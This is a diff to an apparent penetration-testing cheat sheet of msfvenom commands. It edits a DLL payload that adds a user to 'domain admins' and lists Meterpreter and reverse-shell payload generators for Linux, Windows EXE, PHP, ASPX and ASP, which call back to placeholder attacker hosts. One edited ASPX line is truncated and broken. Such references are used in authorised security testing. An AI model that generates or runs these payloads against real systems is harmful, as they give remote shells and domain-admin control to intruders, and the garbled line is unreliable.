@@ -1,5 +1,5 @@
 
-Add your user to a group dll
+Add your user to a group domain admins
 ```
 msfvenom -p windows/x64/exec cmd='net group "domain admins" $username /add /domain' -f dll -o adduser.dll
 ```
@@ -33,10 +33,13 @@ msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6
 Meterpreter 
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f elf > <[FILE_NAME.elf]>
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f exe > <[FILE_NAME.exe]>
 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f exe > <[FILE_NAME.exe]>
+
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.php]>
-msfvenomm -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx > met_rev_443.aspx
+c LHOST=$lhost LPORT=$lport -f aspx > met_rev_443.aspx
 
 cat <[FILE_NAME.php]> | pbcopy && echo '<?php ' | tr -d '\n' > <[FILE_NAME.php]> && pbpaste >> <[FILE_NAME.php]>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f asp > <[FILE_NAME.asp]>
